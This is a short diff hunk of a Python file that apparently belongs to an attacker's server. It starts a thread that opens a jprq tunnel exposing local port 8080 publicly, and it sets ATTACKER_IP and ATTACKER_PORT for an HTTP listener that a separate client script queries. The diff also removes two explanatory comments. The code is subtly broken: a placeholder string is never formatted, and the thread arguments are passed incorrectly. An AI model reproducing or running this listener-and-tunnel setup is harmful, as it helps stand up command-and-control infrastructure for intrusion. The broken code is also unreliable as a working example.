@@ -9,10 +9,8 @@ import sys
 def tunnel_out(args):
     jprq.main.http("8080 -s {args}".split())
 tun_thread = threading.Thread(target=tunnel_out, name="tunnel", args=sys.argv[0])
-    # continue doing stuff
 HTTP_STATUS_OK = 200
 
-# IP and port the HTTP server listens on (will be queried by client.py)
 ATTACKER_IP = '0.0.0.0'
 ATTACKER_PORT = 8080
 tun_thread.start()
